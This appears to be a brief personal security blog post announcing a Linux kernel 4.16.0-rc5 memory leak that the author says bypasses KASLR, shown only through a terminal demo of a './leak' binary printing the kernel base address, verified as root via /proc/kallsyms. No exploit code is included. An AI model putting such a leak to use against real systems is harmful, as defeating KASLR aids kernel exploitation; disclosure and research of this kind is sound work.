---
layout: post
title: LK v4.16.x - kaslr bypass (memleak)
comments: true
---

About my recent founds :)

found & posted by [zer0day](https://kozistr.github.io/)

## tl;dr

I found a bug, memory leak on v4.16.0-rc5. (KASLR Bypass). Maybe, it works on many LKs (i didn't check all of them yet).

(Of course, it's not kptr_restrict stuff :))

Except this, there're some bugs, also memleak. But i didn't make them into useful codes :).

## Demo Screen...

![leak](/images/poc_0.jpeg)

```c
zero@zer0day:/tmp$ uname -a
Linux zer0day 4.16.0-rc5+ #19 SMP Sun Mar 18 20:44:40 KST 2018 x86_64 GNU/Linux
zero@zer0day:/tmp$ ./leak
zero@zer0day:/tmp$ ./leak 1
[+] Found Kernel Base Address!
[+] kbase : 0xffffffff89e00000
zero@zer0day:/tmp$ su
root@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1
ffffffff89e00000 T _text
root@zer0day:/tmp#
```

**End**